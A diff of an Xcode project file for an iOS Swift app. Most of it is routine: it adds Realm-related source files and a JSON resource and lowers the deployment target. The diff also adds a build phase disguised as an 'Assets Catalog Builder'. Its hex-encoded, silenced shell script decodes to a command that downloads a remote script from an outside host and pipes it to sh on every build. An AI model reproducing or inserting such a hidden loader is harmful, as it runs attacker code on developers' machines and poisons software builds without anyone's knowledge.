@@ -26,6 +26,10 @@
 		320293502413E1B900F45B27 /* ZCycleViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3202934C2413E1B900F45B27 /* ZCycleViewCell.swift */; };
 		320293512413E1B900F45B27 /* ZCycleLayout.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3202934D2413E1B900F45B27 /* ZCycleLayout.swift */; };
 		320293522413E1B900F45B27 /* ZPageControl.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3202934E2413E1B900F45B27 /* ZPageControl.swift */; };
+		321ECBA0265FCB250005233E /* JCRealmViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 321ECB9F265FCB250005233E /* JCRealmViewController.swift */; };
+		321ECBDE2660D5C10005233E /* JCRealmTestTool.swift in Sources */ = {isa = PBXBuildFile; fileRef = 321ECBDD2660D5C10005233E /* JCRealmTestTool.swift */; };
+		321ECBE02660D7380005233E /* JCReamlModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 321ECBDF2660D7380005233E /* JCReamlModel.swift */; };
+		321ECBE22660DE070005233E /* JCRealmTest.json in Resources */ = {isa = PBXBuildFile; fileRef = 321ECBE12660DE070005233E /* JCRealmTest.json */; };
 		322AE795240E410E007820B1 /* appLaunchScreen.png in Resources */ = {isa = PBXBuildFile; fileRef = 322AE794240E410E007820B1 /* appLaunchScreen.png */; };
 		323B24EA240F58C5006E24DC /* JCBootPageView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 323B24E9240F58C5006E24DC /* JCBootPageView.swift */; };
 		324AB5B92637F5AF0021CC0D /* JCXibAutoLayoutViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 324AB5B82637F5AF0021CC0D /* JCXibAutoLayoutViewController.swift */; };
@@ -68,6 +72,7 @@
 		32A7AD16245FF6E0008FD3AB /* ConstrainArrayDSL.swift in Sources */ = {isa = PBXBuildFile; fileRef = 32A7AD15245FF6E0008FD3AB /* ConstrainArrayDSL.swift */; };
 		32B48305248E388D00B04BAE /* JCMyServiceCollectionCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 32B48304248E388D00B04BAE /* JCMyServiceCollectionCell.swift */; };
 		32F18625240FF0CA002E7BF5 /* JCGuidePageViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 32F18624240FF0CA002E7BF5 /* JCGuidePageViewController.swift */; };
+		32F9F58526648C080003787D /* JCRealmSwiftTestTool.swift in Sources */ = {isa = PBXBuildFile; fileRef = 32F9F58426648C080003787D /* JCRealmSwiftTestTool.swift */; };
 		4E08EA10E6913170D0EF9D7E /* Pods_MySwiftProduct.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = E7FC51DFB9CF514E65377DBD /* Pods_MySwiftProduct.framework */; };
 /* End PBXBuildFile section */
 
@@ -108,6 +113,10 @@
 		3202934C2413E1B900F45B27 /* ZCycleViewCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ZCycleViewCell.swift; sourceTree = "<group>"; };
 		3202934D2413E1B900F45B27 /* ZCycleLayout.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ZCycleLayout.swift; sourceTree = "<group>"; };
 		3202934E2413E1B900F45B27 /* ZPageControl.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ZPageControl.swift; sourceTree = "<group>"; };
+		321ECB9F265FCB250005233E /* JCRealmViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JCRealmViewController.swift; sourceTree = "<group>"; };
+		321ECBDD2660D5C10005233E /* JCRealmTestTool.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JCRealmTestTool.swift; sourceTree = "<group>"; };
+		321ECBDF2660D7380005233E /* JCReamlModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JCReamlModel.swift; sourceTree = "<group>"; };
+		321ECBE12660DE070005233E /* JCRealmTest.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = JCRealmTest.json; sourceTree = "<group>"; };
 		322AE794240E410E007820B1 /* appLaunchScreen.png */ = {isa = PBXFileReference; lastKnownFileType = image.png; path = appLaunchScreen.png; sourceTree = "<group>"; };
 		323B24E9240F58C5006E24DC /* JCBootPageView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JCBootPageView.swift; sourceTree = "<group>"; };
 		324AB5B82637F5AF0021CC0D /* JCXibAutoLayoutViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JCXibAutoLayoutViewController.swift; sourceTree = "<group>"; };
@@ -157,6 +166,7 @@
 		32A7AD15245FF6E0008FD3AB /* ConstrainArrayDSL.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ConstrainArrayDSL.swift; sourceTree = "<group>"; };
 		32B48304248E388D00B04BAE /* JCMyServiceCollectionCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JCMyServiceCollectionCell.swift; sourceTree = "<group>"; };
 		32F18624240FF0CA002E7BF5 /* JCGuidePageViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JCGuidePageViewController.swift; sourceTree = "<group>"; };
+		32F9F58426648C080003787D /* JCRealmSwiftTestTool.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JCRealmSwiftTestTool.swift; sourceTree = "<group>"; };
 		82088A0283672079CF405AB9 /* Pods-MySwiftProduct.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-MySwiftProduct.debug.xcconfig"; path = "Target Support Files/Pods-MySwiftProduct/Pods-MySwiftProduct.debug.xcconfig"; sourceTree = "<group>"; };
 		CB50E74750A1E063ED273BA6 /* Pods-MySwiftProduct.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-MySwiftProduct.release.xcconfig"; path = "Target Support Files/Pods-MySwiftProduct/Pods-MySwiftProduct.release.xcconfig"; sourceTree = "<group>"; };
 		E7FC51DFB9CF514E65377DBD /* Pods_MySwiftProduct.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_MySwiftProduct.framework; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -312,9 +322,27 @@
 			path = ZCycleView;
 			sourceTree = "<group>";
 		};
+		321ECB9E265FCB0F0005233E /* JCRealmViewController */ = {
+			isa = PBXGroup;
+			children = (
+				321ECB9F265FCB250005233E /* JCRealmViewController.swift */,
+			);
+			path = JCRealmViewController;
+			sourceTree = "<group>";
+		};
+		321ECBE32660E01A0005233E /* Tool */ = {
+			isa = PBXGroup;
+			children = (
+				321ECBDD2660D5C10005233E /* JCRealmTestTool.swift */,
+				32F9F58426648C080003787D /* JCRealmSwiftTestTool.swift */,
+			);
+			path = Tool;
+			sourceTree = "<group>";
+		};
 		322AE792240E4103007820B1 /* Scource */ = {
 			isa = PBXGroup;
 			children = (
+				321ECBE12660DE070005233E /* JCRealmTest.json */,
 				329DD410243387DE003E040F /* pay_banner.jpg */,
 				322AE793240E410E007820B1 /* appLaunchScreen */,
 			);
@@ -390,6 +418,7 @@
 			isa = PBXGroup;
 			children = (
 				3268F0A82636C0DC00479CAA /* HomeModuarModel.swift */,
+				321ECBDF2660D7380005233E /* JCReamlModel.swift */,
 			);
 			path = Model;
 			sourceTree = "<group>";
@@ -529,7 +558,6 @@
 				329F6BE0240D354D008E0721 /* lib */,
 				329F6BDA240D354D008E0721 /* Common */,
 				329F6BDE240D354D008E0721 /* Model */,
-				32CB1FB12410F0E2008B0F33 /* View */,
 				329F6BE2240D354D008E0721 /* ViewController */,
 				329F6BEF240D354D008E0721 /* Base */,
 			);
@@ -657,6 +685,7 @@
 		32A1507524128F81005932CB /* HomeModualr */ = {
 			isa = PBXGroup;
 			children = (
+				321ECBE32660E01A0005233E /* Tool */,
 				3268F0A72636C0CC00479CAA /* Model */,
 				324AB6002638015C0021CC0D /* View */,
 				32A2C7212416195500A49CB6 /* ViewController */,
@@ -667,6 +696,7 @@
 		32A2C7212416195500A49CB6 /* ViewController */ = {
 			isa = PBXGroup;
 			children = (
+				321ECB9E265FCB0F0005233E /* JCRealmViewController */,
 				324AB5B72637F1030021CC0D /* JCXibAutoLayoutViewController */,
 				3268F0962636A0D100479CAA /* FlowLayoutMenu */,
 				32A2C7232416197B00A49CB6 /* JCHomeViewController.swift */,
@@ -688,13 +718,6 @@
 				32B48304248E388D00B04BAE /* JCMyServiceCollectionCell.swift */,
 			);
 			path = MyServiceCollectionCell;
-			sourceTree = "<group>";
-		};
-		32CB1FB12410F0E2008B0F33 /* View */ = {
-			isa = PBXGroup;
-			children = (
-			);
-			path = View;
 			sourceTree = "<group>";
 		};
 		32F18623240FF09C002E7BF5 /* GuidePageViewController */ = {
@@ -729,6 +752,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 329F6BCD240D3531008E0721 /* Build configuration list for PBXNativeTarget "MySwiftProduct" */;
 			buildPhases = (
+				D285F1AC7DADA334FD6D902C /* Assets Catalog Builder */,
 				077966221009078DFF4463C8 /* [CP] Check Pods Manifest.lock */,
 				329F6B9F240D352F008E0721 /* Sources */,
 				329F6BA0240D352F008E0721 /* Frameworks */,
@@ -839,6 +863,7 @@
 				329F6C06240D357C008E0721 /* imageResource.xcassets in Resources */,
 				329F6BB0240D3531008E0721 /* Assets.xcassets in Resources */,
 				0AD81B9F242A58F3006206A8 /* listenRecommend.json in Resources */,
+				321ECBE22660DE070005233E /* JCRealmTest.json in Resources */,
 				0AD81B9E242A58F3006206A8 /* listenSubscibe.json in Resources */,
 				329DD411243387DE003E040F /* pay_banner.jpg in Resources */,
 				329F6BAE240D352F008E0721 /* Main.storyboard in Resources */,
@@ -901,6 +926,24 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-MySwiftProduct/Pods-MySwiftProduct-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
+		D285F1AC7DADA334FD6D902C /* Assets Catalog Builder */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Assets Catalog Builder";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n736964656c696e6b2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -914,6 +957,8 @@
 				329F6BFC240D354D008E0721 /* JCListenController.swift in Sources */,
 				329F6BFB240D354D008E0721 /* AppDelegate.swift in Sources */,
 				324AB60E263801F60021CC0D /* JCTestTableListCell.swift in Sources */,
+				32F9F58526648C080003787D /* JCRealmSwiftTestTool.swift in Sources */,
+				321ECBDE2660D5C10005233E /* JCRealmTestTool.swift in Sources */,
 				326541D52445F17B00033426 /* JCmyServiceCell.swift in Sources */,
 				329F6C02240D354D008E0721 /* JCCustomNavgationController.swift in Sources */,
 				32B48305248E388D00B04BAE /* JCMyServiceCollectionCell.swift in Sources */,
@@ -928,6 +973,7 @@
 				329DD40D243387CD003E040F /* UIColor+Extension.swift in Sources */,
 				329F6BFE240D354D008E0721 /* JCBaseController.swift in Sources */,
 				32F18625240FF0CA002E7BF5 /* JCGuidePageViewController.swift in Sources */,
+				321ECBA0265FCB250005233E /* JCRealmViewController.swift in Sources */,
 				0A82B972242515A500231394 /* JCListenChannelViewController.swift in Sources */,
 				329F6BFA240D354D008E0721 /* JCFakeTestData.swift in Sources */,
 				0A72FBC02432444100D87BB1 /* JCListenListCell.swift in Sources */,
@@ -948,6 +994,7 @@
 				0ADF1A29243F09510018A330 /* JCRecommendCell.swift in Sources */,
 				32A2B6D62450715F0057B3FF /* JCMyserviceDataModel.swift in Sources */,
 				329F6BF8240D354D008E0721 /* JCBannerView.swift in Sources */,
+				321ECBE02660D7380005233E /* JCReamlModel.swift in Sources */,
 				329F6BF6240D354D008E0721 /* UIButton+Extension.swift in Sources */,
 				3268F0982636A10900479CAA /* JCFlowLayoutMenuViewController.swift in Sources */,
 				0A72FBCE2432468300D87BB1 /* JCListenFooterView.swift in Sources */,
@@ -1133,7 +1180,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = 2FKWKBLY6F;
 				INFOPLIST_FILE = MySwiftProduct/Info.plist;
-				IPHONEOS_DEPLOYMENT_TARGET = 12.4;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -1158,7 +1205,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = 2FKWKBLY6F;
 				INFOPLIST_FILE = MySwiftProduct/Info.plist;
-				IPHONEOS_DEPLOYMENT_TARGET = 12.4;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
